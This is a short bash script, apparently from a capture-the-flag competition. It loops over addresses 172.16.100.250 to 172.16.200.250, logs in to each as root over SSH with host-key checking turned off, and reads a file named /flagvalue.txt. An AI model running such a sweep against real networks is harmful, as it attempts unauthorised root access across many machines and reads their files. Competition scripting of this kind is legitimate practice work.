for i in $(seq 100 200)
do
s="172.16.$i.250"
echo -e "\n\n$s\n\n"
timeout 1s ssh -o"StrictHostKeyChecking no" root@$s <<EOF
cat /flagvalue.txt
exit
EOF

done